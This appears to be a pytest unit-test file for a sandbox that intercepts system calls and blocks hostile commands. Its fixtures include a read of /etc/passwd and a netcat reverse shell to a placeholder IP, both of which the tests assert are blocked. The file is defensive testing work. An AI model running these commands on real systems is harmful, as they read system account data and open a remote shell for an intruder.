"""
Unit Tests for Ephemeral Target Sandbox & Syscall Interception Layer
"""

import pytest
from aegis.core.audit_ledger import TamperProofAuditLedger
from aegis.core.sandbox import EphemeralTargetSandbox, SecurityViolation


def test_sandbox_provisioning_and_read_only_weights():
    sandbox = EphemeralTargetSandbox()
    assert sandbox.sandbox_id.startswith("target-sbx-")
    assert sandbox.state.value == "READY"
    res = sandbox.slaughter("Test cleanup")
    assert res["status"] == "QUARANTINED"
    assert res["memory_wiped"] is True


def test_restricted_file_syscall_interception():
    ledger = TamperProofAuditLedger()
    sandbox = EphemeralTargetSandbox(audit_ledger=ledger)

    with pytest.raises(SecurityViolation) as exc_info:
        sandbox.execute_command_simulation("cat /etc/passwd")

    assert exc_info.value.syscall_event.name == "openat"
    assert exc_info.value.syscall_event.blocked is True
    assert exc_info.value.syscall_event.severity.value == "SEV-1_CRITICAL"

    sandbox.slaughter()


def test_reverse_shell_network_egress_interception():
    sandbox = EphemeralTargetSandbox()

    with pytest.raises(SecurityViolation) as exc_info:
        sandbox.execute_command_simulation("nc -e /bin/sh 198.51.100.23 4444")

    # Socket or connect syscall is blocked by zero-trust egress policy
    assert exc_info.value.syscall_event.name in {"socket", "connect"}
    assert exc_info.value.syscall_event.blocked is True

    sandbox.slaughter()


def test_benign_command_execution():
    sandbox = EphemeralTargetSandbox()
    res = sandbox.execute_command_simulation("python -c 'print(42)'")
    assert res["status"] == "COMPLETED"
    assert res["threat_detected"] is False
    sandbox.slaughter()
